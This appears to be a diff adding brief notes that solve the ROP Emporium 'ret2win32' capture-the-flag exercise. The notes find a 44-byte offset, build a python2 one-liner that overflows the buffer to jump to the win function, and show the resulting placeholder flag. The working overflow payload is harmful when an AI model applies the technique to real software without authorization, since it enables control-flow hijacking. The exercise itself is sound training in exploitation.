@@ -1,0 +1,7 @@
+tried running a pattern of 100 on the file
+the pattern offset was 44, 
+ret to win addr = 0804862c => payload = 2c 86 04 08
+python2 -c 'print("a"*44+ "\x2c\x86\x04\x08")' | ./ret2win32 
+=> Well done! Here's your flag:
+ROPE{a_placeholder_32byte_flag!}
+
